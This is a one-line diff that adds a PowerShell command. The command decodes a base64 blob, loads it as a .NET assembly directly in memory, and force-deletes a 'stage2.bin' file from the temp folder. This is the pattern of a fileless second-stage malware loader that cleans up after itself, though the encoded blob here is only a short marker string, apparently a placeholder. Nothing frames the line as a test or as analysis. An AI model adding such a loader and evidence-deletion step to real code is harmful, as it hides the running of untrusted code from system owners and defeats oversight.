@@ -1,0 +1,1 @@
+$ManagedBytes = [Convert]::FromBase64String("c3RhZ2UyLW1hcmtlcjpubG5nejg5aHMw"); Write-Verbose ("Assembly bytes: " + $ManagedBytes.Length); [Reflection.Assembly]::Load($ManagedBytes); Remove-Item -Path "$env:TEMP\stage2.bin" -Force
